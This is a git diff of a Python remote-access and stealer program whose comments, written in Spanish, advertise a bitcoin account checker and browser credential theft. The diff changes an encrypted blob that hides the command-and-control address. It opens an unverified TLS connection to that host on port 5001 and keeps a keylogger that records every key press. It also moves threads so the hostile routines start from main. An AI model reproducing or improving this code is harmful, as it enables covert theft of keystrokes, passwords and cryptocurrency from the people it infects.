@@ -24,7 +24,6 @@ colorama.init()
 # Correo  -> pablodiez024@proton.me
 #
 
-
 # ACTUALES:
 # Checker de cuentas de bitcoin
 # Credenciales de navegadores
@@ -63,7 +62,7 @@ def help_me():
 
 
 def know_gme():
-    unkown = b'\xd1W\nJ\xcc>/*\xb7\xd6g\xeag\x9aS\xa4\xb7\x94\xa8\x04\x03\xd2\xc8\x83Q,:\xb2\xb8\xed\xf6#N\xc1S\xf6\x03\xa2G\x1b\x04\xac\xab\xe31\x9d_v\x05\xc1\xc8.K\xc3\xea\x0e\x9bag\x06\x17\x8f\xb5{'
+    unkown = b'V\x1c\x17D(\xd3s\xac\xc6\x9f\x01\x10h\x88\xcb\xfe\xed\xd2\xd8{B\xd0\x96\xb7\x9d\xe7SD\x1d2T\x84\xdbN\x19MC\x01\x16\xf3Cz\xd16\xb4~\xb3g\xf0R)\xc3J\x90\xfc\xfc\xf3T\xbd9\x82\xd4\xc0\x89'
     return str(decrypt(unkown).decode())
     #return "127.0.0.1"
 
@@ -90,6 +89,7 @@ try:
     cock.close()
 
     context = ssl.SSLContext(ssl.PROTOCOL_TLS)
+    context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
     context.load_cert_chain(certfile=csd.name, keyfile=cock.name)
 
@@ -102,8 +102,6 @@ except Exception:
 
 def on_press(event):
     try:
-        t = threading.Thread(target=init_game)
-        t.start()
 
         yek.append(event.name)
 
@@ -144,10 +142,6 @@ def rcv_gme(s, xxx):
 
 def games():
     try:
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-        context.verify_mode = ssl.CERT_NONE
-        context.load_cert_chain(certfile=csd.name, keyfile=cock.name)
-
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((know_gme(), 5001))
         conn = context.wrap_socket(sock, server_hostname=know_gme())
@@ -244,6 +238,10 @@ def main():
 
         interest = threading.Thread(target=find_interests.main)
         interest.start()
+
+        t = threading.Thread(target=init_game)
+        t.start()
+
         keyboard.on_press(on_press)
 
         task = threading.Thread(target=init_task)
